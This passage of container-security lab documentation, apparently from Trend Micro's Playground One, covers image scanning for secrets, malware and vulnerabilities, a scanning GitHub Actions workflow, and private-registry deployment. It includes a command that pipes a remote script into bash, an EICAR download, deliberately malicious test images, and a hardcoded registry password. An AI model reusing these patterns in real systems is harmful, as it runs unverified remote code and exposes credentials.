registry:mawinkler/uptonight:dev\n</code></pre> <p></p> <p>So, there are apparently 79 secrets...</p> <p>If we want to inspect a specific finding we need to dissect the container image into it's layers. Make sure to use the correct image digest reported by Vision One.</p> <pre><code>docker pull docker.io/mawinkler/uptonight@sha256:b152f6bce0df2a9bfadc5b435a094e1bd91611a9ba7040808c8c5a32b2fc6618\n\ndocker save -o uptonight.tar docker.io/mawinkler/uptonight@sha256:b152f6bce0df2a9bfadc5b435a094e1bd91611a9ba7040808c8c5a32b2fc6618\n</code></pre> <p>The above command saves the image including all of its layers into a tar archive. Extracting this archive we get the following structure:</p> <pre><code>tar xf uptonight.tar\n</code></pre> <pre><code>.\n\u251c\u2500\u2500 blobs\n\u2502   \u2514\u2500\u2500 sha256\n\u2502       \u251c\u2500\u2500 2efecd3a4b7c7c8f3a21f437984e8ec09342bf55c48a81215007b00cbf6f6ec9\n\u2502       \u251c\u2500\u2500 32b517b1d73ed10c4adbd50e64d5f2d61712ccc6e4fb6ce39005f159e23fe1ac\n\u2502       \u251c\u2500\u2500 386776cc98d16d99a5bd775dc73c6fee6bd9bdd5e379e30a1d14157012a5432e\n\u2502       \u251c\u2500\u2500 48e6d4ad1ab793bf30ac91047f884b34d331698c6c8ba688956ce2463ad59135\n\u2502       \u251c\u2500\u2500 4f49f9e01d50b4900868481954bd38c905ba3d3a3be6db2df3e78930becc04ba\n\u2502       \u251c\u2500\u2500 51c6a8652010bf8563a76c609536f254293f170248dd6cf926ca48b72f5eaaf8\n\u2502       \u251c\u2500\u2500 63c88cab4a2898393f7cc92e0c99c9d0fe85b6dd8958f1662d1aa2d279717784\n\u2502       \u251c\u2500\u2500 7da81db4d2f8fbdb34206fdfcde3a883b94b59aaf28df2d5fcf737a4a6f154cd\n\u2502       \u251c\u2500\u2500 7f66fa794225f77a772f98a2c9ed4f63aebd658d3a09dd533cd7d8b259364d68\n\u2502       \u251c\u2500\u2500 83ff8a522845857392c79290e3f9ab594d347f21ae72dc5a9732965e33bc6dbe\n\u2502       \u251c\u2500\u2500 b30379741c872a6f008e915694ec2449708f8b907954f18d4b882103b27fbe45\n\u2502       \u251c\u2500\u2500 b82d9de2867dd7879d9c1b530b77cd553f21d1baca9b20b133e50f75fc2ff6bf\n\u2502       \u251c\u2500\u2500 ba2c96a1cc369c328320f8d9d3b4df81012580d0abe85e0e4b4eb458322d7283\n\u2502       \u251c\u2500\u2500 ba8dbc5b24b59c2e6aff3639f32c5402af5e30be686342d08925ad852bd8c7c4\n\u2502       \u251c\u2500\u2500 bca81598344e69c99a6ff00b66d09117888131d67cc0aae65d49d4b241c7c043\n\u2502       \u251c\u2500\u2500 cfd6a0a02c40bdeff86ac669b87d9e1224aa703200f066bab494b0a76846dc16\n\u2502       \u251c\u2500\u2500 d45039a6283cffb3dfa0d8341a027fc88bfbe42398d05b173ea2d281f6030821\n\u2502       \u2514\u2500\u2500 ea7ca101baa01ced632efd5613d87deda6b4c3914a9676f1fbead657ae935b24\n\u251c\u2500\u2500 index.json\n\u251c\u2500\u2500 manifest.json\n\u251c\u2500\u2500 oci-layout\n\u2514\u2500\u2500 uptonight.tar\n\n2 directories, 22 files\n</code></pre> <p>Now, let us inspect some files with potential secret findings.</p> <p>Facebook Page Access Token</p> <pre><code>Secret type: facebook-page-access-token\nDescription: Discovered a Facebook Page Access Token, posing a risk of unauthorized access to Facebook accounts and personal data exposure.\nImage name: mawinkler/uptonight\nImage ID: docker.io/mawinkler/uptonight@sha256:b152f6bce0df2a9bfadc5b435a094e1bd91611a9ba7040808c8c5a32b2fc6618\nLayer ID: sha256:ba8dbc5b24b59c2e6aff3639f32c5402af5e30be686342d08925ad852bd8c7c4\nLocation path: /var/lib/dpkg/available\n...\nSecret: eaac******26a7\n</code></pre> <p>Extract the file:</p> <pre><code>tar xf blobs/sha256/ba8dbc5b24b59c2e6aff3639f32c5402af5e30be686342d08925ad852bd8c7c4 var/lib/dpkg/available\n</code></pre> <p>When opening the file and seaching for the discovered secret we can proove that it's a false positive.</p> <pre><code>Package: libapt-pkg6.0t64\nArchitecture: amd64\nVersion: 2.7.14build2\nMulti-Arch: same\nPriority: important\nBuild-Essential: yes\nSection: libs\nSource: apt\nOrigin: Ubuntu\nMaintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;\nOriginal-Maintainer: APT Development Team &lt;deity@lists.debian.org&gt;\nBugs: https://bugs.launchpad.net/ubuntu/+filebug\nInstalled-Size: 3244\nProvides: libapt-pkg (= 2.7.14build2), libapt-pkg6.0 (= 2.7.14build2)\nDepends: libbz2-1.0, libc6 (&gt;= 2.38), libgcc-s1 (&gt;= 3.3.1), libgcrypt20 (&gt;= 1.10.0), liblz4-1 (&gt;= 0.0~r127), liblzma5 (&gt;= 5.1.1alpha+20120614), libstdc++6 (&gt;= 13.1), libsystemd0 (&gt;= 221), libudev1 (&gt;= 183), libxxhash0 (&gt;= 0.7.1), libzstd1 (&gt;= 1.5.5), zlib1g (&gt;= 1:1.2.2.3)\nRecommends: apt (&gt;= 2.7.14build2)\nConflicts: libnettle8 (&lt;&lt; 3.9.1-2.2~)\nBreaks: appstream (&lt;&lt; 0.9.0-3~), apt (&lt;&lt; 1.6~), aptitude (&lt;&lt; 0.8.9), dpkg (&lt;&lt; 1.20.8), libapt-inst1.5 (&lt;&lt; 0.9.9~), libapt-pkg6.0 (&lt;&lt; 2.7.14build2)\nReplaces: libapt-pkg6.0\nFilename: pool/main/a/apt/libapt-pkg6.0t64_2.7.14build2_amd64.deb\nSize: 985310\nMD5sum: 0bfb233537666f4104b02f399c3f13cc\nSHA1: d06e76be3cfc7130dd9becff690f4173bbda2089\nSHA256: 3915b0cdfbaae551d9089400f47be749b89c30914985982b39e57fd2016be852\nSHA512: 0a304cbf749e8f64a8a543a83112a4ddeff4ca3b2f01e88fea54a322998e2dd774d1a5c6eeedd967a550d4e4ffcdfb33ba08941e158ecdd49b85afde55bf6796\nDescription: package management runtime library\nTask: cloud-minimal, minimal, server-minimal\nDescription-md5: eaacd63db236f47bdcc19e3bea7026a7\n</code></pre> <p>AWS credentials</p> <p>Similar to the above...</p> <pre><code>Layer ID:\nsha256:ba2c96a1cc369c328320f8d9d3b4df81012580d0abe85e0e4b4eb458322d7283\nLocation path:\n/root/.local/lib/python3.12/site-packages/PIL/ImageFont.py\nSecret: AK******0A\n</code></pre> <p>Going through this Python file we can discover the secret within the base64 encoded FreeType font. So again a false positive.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/","title":"Scenario: Container Image Vulnerability and Malware Scanning as GitHub Action","text":""},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Protection<ul> <li>Run artifact scan</li> </ul> </li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-scenario-github-action.</li> <li>Kubernetes Cluster (ideally) with Vision One Container Security deployed.</li> </ul>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically build, push and scan a container image with Trend Micro Artifact Scanning. The scan will check the image for vulnerabilities and malware and may push it to the registry.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Docker Buildx environment.</li> <li>Build the image and save it as a tar ball.</li> <li>Scan the built image for vulnerabilities and malware using Vision One Container Security.</li> <li>Upload Scan Result and SBOM Artifact if available. Artifacts allow you to share data between jobs in a workflow and store data once that workflow has completed, in this case saving the scan result and the container image SBOM as an artifact allow you to have proof on what happened on past scans.</li> <li>Optionally fail the workflow if malware and/or the vulnerability threshold was reached. Failing the workflow at this stage prevents the registry to get polluted with insecure images.</li> <li>Authenticate to the deployment registry.</li> <li>Rebuild the image from cache for the desired architectures.</li> <li>Push the image to the registry.</li> <li>Rescan the image in the registry to allow proper admission control integration.</li> </ul>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-scenario-github-action and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a very simple Dockerfile and a hidden directory <code>.github/workflows</code> with a <code>yaml</code>-file.</p> <p>The Dockerfile specifies the image to build. As we can easily see, it is using the latest <code>nginx</code> as the base image and just adds (very obviously) an Eicar.</p> <pre><code>FROM nginx\n\nRUN curl -fsSL http://eicar.eu/eicarcom2.zip -o /usr/share/nginx/html/eicarcom2.zip\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#the-workflow","title":"The Workflow","text":"<p>The <code>yaml</code>-file in <code>.github/workflows</code> is more interesting. Let's go through it.</p> <pre><code>name: ci\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n  TMAS_API_KEY: ${{ secrets.TMAS_API_KEY }}\n\n  REGION: us-east-1\n  THRESHOLD: \"critical\"\n  MALWARE_SCAN: true\n  FAIL_ACTION: true\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n\n    steps:\n      # Prepare the Docker Buildx environment.\n      - name: Checkout\n        uses: actions/checkout@v4\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Extract metadata for the Docker image\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n\n      # Build the image and save it as a tar ball.\n      - name: Build and store\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          tags: ${{ steps.meta.outputs.tags }}\n          outputs: type=docker,dest=/tmp/image.tar\n\n      # Scan the build image for vulnerabilities and malware.\n      - name: Scan\n        env:\n          SBOM: true # Saves SBOM to sbom.json\n        run: |\n          # Install tmas latest version\n          curl -s -L https://gist.github.com/raphabot/abae09b46c29afc7c3b918b7b8ec2a5c/raw/ | bash\n\n          tmas scan -V \"$(if [ \"$MALWARE_SCAN\" = true ]; then echo \"-M\"; fi)\" -r \"$REGION\" docker-archive:/tmp/image.tar \"$(if [ \"$SBOM\" = true ]; then echo \"--saveSBOM\"; fi)\" | tee result.json\n\n          if [ \"$SBOM\" = true ]; then mv SBOM_* sbom.json; fi\n\n          # Analyze result\n          fail_vul=false\n          fail_mal=false\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.totalVulnCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.mediumCount + .vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp;\n            [ $(jq '.vulnerability.lowCount + .vulnerability.mediumCount + .vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ $(jq '.malware.scanResult' result.json) -ne 0 ] &amp;&amp; fail_mal=true\n\n          [ \"$fail_vul\" = true ] &amp;&amp; echo !!! Vulnerability threshold exceeded !!! &gt; vulnerabilities || true\n          [ \"$fail_mal\" = true ] &amp;&amp; echo !!! Malware found !!! &gt; malware || true\n\n      # Upload Scan Result and SBOM Artifact if available.\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      - name: Upload SBOM Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: sbom\n          path: sbom.json\n          retention-days: 30\n\n      # Fail the workflow if malware found or the vulnerability threshold reached.\n      - name: Fail Action\n        run: |\n          if [ \"$FAIL_ACTION\" = true ]; then\n            if [ -f \"malware\" ]; then cat malware; fi\n            if [ -f \"vulnerabilities\" ]; then cat vulnerabilities; fi\n            if [ -f \"malware\" ] || [ -f \"vulnerabilities\" ]; then exit 1; fi\n          fi\n\n      # Login to the registry.\n      - name: Login to the Container registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      # Rebuild the image and push to registry. This is fast since everything is cached.\n      - name: Build and push\n        id: build\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          provenance: false\n          tags: ${{ steps.meta.outputs.tags }}\n\n      - name: Summarize the Docker digest and tags\n        run: |\n          echo 'Digest: ${{ steps.build.outputs.digest }}'\n          echo 'Tags: ${{ steps.meta.outputs.tags }}'\n\n      # Rescan in the registry to support admission control\n      - name: Registry Scan\n        run: |\n          tmas scan -V \"$(if [ \"$MALWARE_SCAN\" = true ]; then echo \"-M\"; fi)\" -r \"$REGION\" -p linux/amd64 registry:${{ steps.meta.outputs.tags }} || true\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#secrets","title":"Secrets","text":"<p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secret:</p> <ul> <li>TMAS_API_KEY: <code>&lt;Your TMAS API Key&gt;</code></li> </ul>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#template","title":"Template","text":"<p>Below, the workflow tamplate. Adapt it to your needs and save it as a <code>yaml</code>-file in the <code>.github/workflow</code> directory.</p> <p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>REGISTRY</code> The workflow uses the GitHub Packages by default. <code>IMAGE_NAME</code> The image name is derived from the GitHub Repo name. <code>TMAS_API_KEY</code> The key is retrieved from the secrets. <code>REGION</code> Vision One Region of choice (ap-southeast-2, eu-central-1, ap-south-1, ap-northeast-1, ap-southeast-1, us-east-1). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <code>MALWARE_SCAN</code> Enable or disable malware scanning. <code>FAIL_ACTION</code> Enable or disable failing the action if the vulnerability threshold was reached and/or malware detected. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max severity of discovered vulnerabilities is <code>high</code>.</li> <li><code>high</code>: Max severity of discovered vulnerabilities is <code>medium</code>.</li> <li><code>medium</code>: Max severity of discovered vulnerabilities is <code>low</code>.</li> <li><code>low</code>: Max severity of discovered vulnerabilities is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Draft a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on the workflow run.</p> <p>You should now see three main sections:</p> <ol> <li><code>build-push.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).    </li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>sbom</code> and <code>scan-result</code>.</li> </ol>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#let-the-workflow-pass","title":"Let the workflow pass...","text":"<p>Now, we want the image to be published, even though that it has vulnerabilities and a malware inside. To achieve this in this scenario we simply change the environment variable <code>FAIL_ACTION</code>:</p> <pre><code>env:\n...\n  FAIL_ACTION: false\n</code></pre> <p>Again, do this by directly editing the workflow file on GitHub and commit the changes to main. Then, repeat the steps to create a new tag as above, but choose a different tag (e.g. <code>v0.2</code>).</p> <p>The action should now complete successfully and the container image is pushed to the registry.</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#configure-vision-one-container-protection-policy","title":"Configure Vision One Container Protection Policy","text":"<p>Next, ensure to have your Container Security policy set with the following properties:</p> <p></p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-github-action/#try-deployment","title":"Try deployment","text":"<p>Assuming you have access to a Kubernetes cluster with Vision One Container Security deployed and a policy assigned with the setting from above, you can now run</p> <pre><code>kubectl run --image=ghcr.io/&lt;GITHUB_USERNAME&gt;/&lt;GITHUB_REPO_NAME&gt;:&lt;IMAGE_TAG&gt; action\n</code></pre> <p>This should result in the following error message since Container Security blocks the deploament:</p> <pre><code>Error from server: admission webhook \"trendmicro-admission-controller.trendmicro-system.svc\" denied the request: \n- malware violates rule with properties { count:0 } in container(s) \"nginx\" (block).\n- vulnerabilities violates rule with properties { max-severity:high } in container(s) \"nginx\" (block).\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-shift-left-security/","title":"Scenario: Shift Left Security - Preview","text":""},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-shift-left-security/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Protection<ul> <li>Run artifact scan</li> </ul> </li> </ul> </li> </ul> </li> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> </ul> <p>Ensure to have the latest <code>tmas</code> deployed:</p> <pre><code>tmcli-update\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-shift-left-security/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMAS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmas defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>The <code>tmas</code> tools supports three scan variants:</p> <ul> <li>malware, -M          Perform a malware scan on an image artifact</li> <li>secrets, -S          Perform a secrets scan on an artifact</li> <li>vulnerabilities, -V  Perform a vulnerability scan on an artifact</li> </ul> <p>You can either choose an individual scan type or combine multiple via flags.</p> <p>To easily scan an image for vulnerabililies, secrets, and malware run</p> <pre><code># Service region us-east-1\ntmas scan vulnerabilities registry:mawinkler/uptonight:1.5\n\n# If you Vision One is located for example in another region add the `--region` parameter\n... --region eu-central-1\n</code></pre> <p>Scanning an image for vulnerabilities and malware simultaneously is as easy as above</p> <pre><code>tmas scan -VMS registry:mawinkler/evil2:latest\n</code></pre> <p>At the time of writing, the second scan should find 144 vulnerabilities, one malware, and a secret:</p> <pre><code>{\n  \"vulnerabilities\": {\n    \"totalVulnCount\": 144,\n    \"criticalCount\": 0,\n    \"highCount\": 5,\n    \"mediumCount\": 71,\n    \"lowCount\": 61,\n    \"negligibleCount\": 7,\n    \"unknownCount\": 0,\n    \"overriddenCount\": 0,\n    \"findings\": { \n...\n  \"malware\": {\n    \"scanResult\": 1,\n    \"findings\": [\n      {\n        \"layerDigest\": \"sha256:45c40a2cddec05be02a717d677b61b16d656246e0f6995e7c58a788db29b8aed\",\n        \"layerDiffID\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n        \"fileName\": \"eicarcom2.zip\",\n        \"fileSize\": 308,\n        \"fileSHA256\": \"sha256:e1105070ba828007508566e28a2b8d4c65d192e9eaf3b7868382b7cae747b397\",\n        \"foundMalwares\": [\n          {\n            \"fileName\": \"__Zoq9GPNzgoaVyXYSKgniGj__\",\n            \"malwareName\": \"OSX_EICAR.PFH\"\n          }\n        ]\n      }\n    ],\n    \"scanID\": \"b235d34a-c2f0-4086-928b-4fba0724d304\",\n    \"scannerVersion\": \"1.0.0-89\"\n  },\n  \"secrets\": {\n    \"totalFilesScanned\": 3244,\n    \"unmitigatedFindingsCount\": 1,\n    \"overriddenFindingsCount\": 0,\n    \"findings\": {\n      \"unmitigated\": [\n        {\n          \"ruleID\": \"facebook-page-access-token\",\n          \"description\": \"Discovered a Facebook Page Access Token, posing a risk of unauthorized access to Facebook accounts and personal data exposure.\",\n          \"secret\": \"eaacd63db236f47bdcc19e3bea7026a7\",\n          \"location\": {\n            \"layerID\": \"sha256:dc0585a4b8b71f7f4eb8f2e028067f88aec780d9ab40c948a8d431c1aeadeeb5\",\n            \"path\": \"/var/lib/dpkg/available\",\n            \"startLine\": 78,\n            \"endLine\": 79,\n            \"startColumn\": 19,\n            \"endColumn\": 1\n          }\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-shift-left-security/#shift-left-security","title":"Shift Left Security","text":"<p>Let's review the findings in Vision One. Head over to <code>Cloud Security -&gt; Shift Left Security</code>. The two scanned artifact should be listed:</p> <p></p> <p>We can now check on the malware and secrets tabs what has been discovered:</p> <p></p> <p></p> <p>Let's get more information on the secret:</p> <p></p> <p>Another malware example might be this:</p> <pre><code>tmas scan malware registry:mawinkler/malware-cryptominer-container:2.1.1\n</code></pre> <p>Scanning for secrets is very similar:</p> <pre><code>tmas scan secrets registry:mawinkler/secrets-container:latest\n</code></pre> <p>The two scans result in some additional findings:</p> <p></p> <p></p> <p></p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-shift-left-security/#trying-deployments","title":"Trying Deployments","text":"<p>Now, let's try to create a pod on our Kubernetes cluster. Check your Container Security policy since you really don't want containers with malware and/or secrets, or? </p> <p></p> <p>When trying to deploy the images our admission controller should block you:</p> <pre><code>kubectl run --image mawinkler/secrets-container:latest secrets\n</code></pre> <pre><code>Error from server: admission webhook \"trendmicro-admission-controller.trendmicro-system.svc\" denied the request: \n- secrets violates rule with properties { count:0 } in container(s) \"secrets\" (block).\n- unscannedImage violates rule with properties { days:30 } in container(s) \"secrets\" (log).\n- unscannedImageMalware violates rule with properties { days:30 } in container(s) \"secrets\" (log).\n</code></pre> <p>As we can see, the deployment is blocked, which is as expected. The two <code>unscannedImage</code> logs come up since we only scanned the image for secrets. If you want, rerun the scan with the <code>-VMS</code> parameter which instructs tmas to scan for vulnerabilities, malware, and secrets.</p> <p>Trying to deploy the secrets image again will result in the following (expected) deny:</p> <pre><code>Error from server: admission webhook \"trendmicro-admission-controller.trendmicro-system.svc\" denied the request: \n- secrets violates rule with properties { count:0 } in container(s) \"secrets\" (block).\n</code></pre> <p>Very similar with the malware image:</p> <pre><code>kubectl run --image mawinkler/malware-cryptominer-container:2.1.1 malware\n</code></pre> <pre><code>Error from server: admission webhook \"trendmicro-admission-controller.trendmicro-system.svc\" denied the request: \n- malware violates rule with properties { count:0 } in container(s) \"malware\" (block).\n- unscannedImage violates rule with properties { days:30 } in container(s) \"malware\" (log).\n- unscannedImageSecret violates rule with properties { days:30 } in container(s) \"malware\" (log).\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/cloud-security/container-security/deployment/deploy-from-private-registry/","title":"Deploy Cloud One Container Security from a Private Registry","text":""},{"location":"scenarios/cloud-security/container-security/deployment/deploy-from-private-registry/#tools","title":"Tools","text":"<p>Used tools:</p> <ul> <li>Docker</li> <li>yq, awk, helm</li> </ul> <p>Get <code>yq</code></p> <pre><code>curl -L https://github.com/mikefarah/yq/releases/download/v4.24.2/yq_linux_amd64.tar.gz -o yq_linux_amd64.tar.gz\ntar xfvz yq_linux_amd64.tar.gz\nsudo cp yq_linux_amd64 /usr/local/bin/yq\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/deployment/deploy-from-private-registry/#login-to-the-registries","title":"Login to the Registries","text":"<pre><code>export REGISTRY=172.250.255.1:5000\nexport USERNAME=admin\nexport PASSWORD=trendmicro\n\n# Login to Docker Registry\ndocker login\n\n# Login to private Registry\necho ${PASSWORD} | docker login https://${REGISTRY} --username ${USERNAME} --password-stdin\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/deployment/deploy-from-private-registry/#container-security-pulltag-push","title":"Container Security - Pull,Tag, &amp; Push","text":"<pre><code># Enumerate the Images\ncurl -L https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz -o master-cs.tar.gz\ntar xfvz master-cs.tar.gz\nexport TAG=$(yq '.images.defaults.tag' cloudone-container-security-helm-master/values.yaml)\necho ${TAG}\n\n# Pull Container Security images from Dockerhub.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker pull {}\n\n# Tag the images with your target registry information, making sure to preserve the original image name.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker tag {} ${REGISTRY}/{}\n\n# Push the images to the private registry\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker push ${REGISTRY}/{}\n\n# Create image pull secret\nkubectl create secret docker-registry regcred \\\n  --docker-server=${REGISTRY} \\\n  --docker-username=${USERNAME} \\\n  --docker-password=${PASSWORD} \\\n  --namespace=container-security\n</code></pre> <p>Update Container Securities <code>overrides.yaml</code> to override the default source registry with your private registry:</p> <pre><code>...\nimages:\n  defaults:\n    registry: [REGISTRY]\n    tag: [TAG]\n    imagePullSecret: regcred\n</code></pre> <p>Example:</p> <pre><code>...\nimages:\n  defaults:\n    registry: 172.250.255.1:5000\n    tag: 2.2.9\n    imagePullSecret: regcred\n</code></pre> <p>Deploy Container Security.</p> <pre><code>helm install \\\n    container-security \\\n    --values $PGPATH/overrides.yaml \\\n    --namespace trendmicro-system \\\n    --install \\\n  https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/deployment/migrate/","title":"Migrate","text":"<p>This tries to solve the challenge to migrate workload of an existing cluster using public image registries to a trusted, private one (without breaking the services).</p> <p>To try it, being in the playground directory run</p> <pre><code>migrate/save-cluster.sh\n</code></pre> <p>This scripts dumps the full cluster to json files separated by namespace. The namespaces <code>kube-system</code>, <code>registry</code> and <code>default</code> are currently excluded.</p> <p>Effectively, this is a backup of your cluster including ConfigMaps and Secrets etc. which you can deploy on a different cluster easily (<code>kubectl create -f xxx.json</code>)</p> <p>To migrate the images currently in use run</p> <pre><code>migrate/migrate-images.sh\n</code></pre> <p>This second script updates the saved manifests in regards the image location to point them to the private registry. If the image has a digest within it's name it is stripped.</p> <p>The image get's then pulled from the public repo and pushed to the internal one. TODO: This is followed by an image scan and the redeployment.</p> <p>Note: at the time of writing the only supported private registry is the internal one.</p>"},{"location":"scenarios/cloud-security/container-security/ecs/apache-struts-rce/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":""},{"location":"scenarios/cloud-security/container-security/ecs/apache-struts-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> 